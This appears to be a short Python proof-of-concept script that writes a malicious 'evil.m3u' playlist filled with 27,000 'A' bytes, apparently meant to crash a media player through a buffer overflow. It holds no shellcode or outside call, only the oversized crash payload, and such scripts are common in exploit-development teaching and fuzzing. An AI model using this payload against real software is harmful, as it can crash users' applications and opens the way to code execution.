#!/usr/bin/python

filename="evil.m3u"
buffer = "\x41"* 27000 
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()